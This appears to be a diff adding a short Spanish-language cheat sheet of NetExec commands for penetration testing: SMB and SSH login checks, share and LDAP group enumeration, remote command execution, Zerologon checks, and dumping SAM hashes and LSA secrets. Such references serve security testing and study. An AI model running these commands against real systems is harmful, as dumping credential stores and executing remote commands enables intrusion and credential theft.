@@ -1,0 +1,23 @@
+▶ Por SMB (Autenticación SMB):
+  netexec smb $IP -u <usuario> -p <contraseña>
+
+▶ Por SSH (Autenticación SSH):
+  netexec ssh $IP -u <usuario> -p <contraseña>
+
+▶ Enumeración de Shares (Listar recursos compartidos):
+  netexec smb $IP -u <usuario> -p <contraseña> --shares
+
+▶ Ejecución de Comandos (Ejecutar comando remoto):
+  netexec smb $IP -u <usuario> -p <contraseña> -x "whoami"
+
+▶ Dump de SAM (Extraer hashes SAM):
+  netexec smb $IP -u <usuario> -p <contraseña> --sam
+
+▶ Enumeración de Grupos (Listar grupos LDAP):
+  netexec ldap $IP -u <usuario> -p <contraseña> --groups
+
+▶ Búsqueda de Vulnerabilidades (Detectar Zerologon):
+  netexec smb $IP -u <usuario> -p <contraseña> -M zerologon
+
+▶ Dump de LSA Secrets (Extraer secretos locales):
+  netexec smb $IP -u <usuario> -p <contraseña> --lsa
